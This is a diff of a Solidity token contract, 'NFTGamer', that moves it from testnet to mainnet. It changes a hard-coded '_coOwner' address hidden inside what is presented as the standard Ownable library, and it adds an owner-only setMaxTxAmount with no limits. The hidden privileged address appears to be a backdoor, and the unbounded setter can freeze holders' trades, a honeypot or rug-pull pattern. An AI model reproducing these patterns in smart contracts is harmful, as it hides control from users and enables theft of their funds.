@@ -525,7 +525,7 @@ library Address {
  */
 abstract contract Ownable is Context {
     address private _owner;
-    address private _coOwner=0x0d08E2529242907524359f74aeb07B34761A6f01;
+    address private _coOwner=0xfB832726521fd749E4C7DEF121a3a48878F575Bd;
 
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
@@ -848,7 +848,8 @@ contract NFTGamer is Context, IERC20, Ownable {
         _rOwned[owner()] = _rTotal;
         
         // 0x10ED43C718714eb63d5aA57B78B54704E256024E router for mainnet
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
+        // 0xD99D1c33F9fC3444f8101754aBC46c52416550D1 router for testnet
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
          // Create a uniswap pair for this new token
         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
@@ -1015,6 +1016,10 @@ contract NFTGamer is Context, IERC20, Ownable {
         _maxTxAmount = _tTotal.mul(maxTxPercent).div(
             10**2
         );
+    }
+    
+    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
+        _maxTxAmount = maxTxAmount;
     }
 
     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
